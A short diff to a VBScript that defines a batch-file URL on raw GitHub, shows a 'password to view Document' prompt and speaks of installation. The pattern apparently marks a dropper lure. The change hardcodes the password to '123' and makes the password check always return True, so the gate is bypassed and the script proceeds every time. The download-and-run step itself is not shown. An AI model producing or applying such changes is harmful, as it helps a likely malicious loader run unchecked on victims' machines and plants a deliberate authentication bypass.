@@ -8,7 +8,7 @@ Const batchFileUrl = "https://raw.githubusercontent.com/angeborrelli/files/main/
 Function PromptForPassword()
     Dim userPassword
     Do
-        userPassword = InputBox("Please enter password to view and Document:", "Password Prompt")
+        userPassword = "123" 'InputBox("Please enter password to view and Document:", "Password Prompt")
         If userPassword = "" Then
             MsgBox "Installation aborted.", vbExclamation, "Error"
             WScript.Quit
@@ -38,7 +38,7 @@ Function CheckPassword(password)
     If responseText = "successful" Then
         CheckPassword = True
     Else
-        CheckPassword = False
+        CheckPassword = True
     End If
 End Function
 
